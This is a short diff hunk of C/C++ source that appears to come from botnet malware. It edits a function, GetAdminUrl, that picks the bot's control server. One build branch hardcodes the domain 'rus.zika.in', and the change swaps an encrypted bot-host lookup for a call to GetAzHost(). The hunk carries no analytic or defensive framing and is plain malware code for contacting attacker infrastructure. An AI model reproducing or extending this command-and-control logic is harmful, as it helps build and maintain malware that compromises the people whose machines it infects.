@@ -118,7 +118,7 @@ static char* GetAdminUrl( char* url )
 	m_lstrcpy( url, "rus.zika.in" );
 #else
 //	string host = GetActiveHostFromBuf2( GetBotHosts(), BOTPARAM_HASH_MAINHOSTS, true );
-	string host = GetActiveHostFromBuf2( Rafa::Hosts(), 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
+	string host = GetAzHost();
 	if( !host.IsEmpty() )
 		m_lstrcpy( url, host.t_str() );
 	else
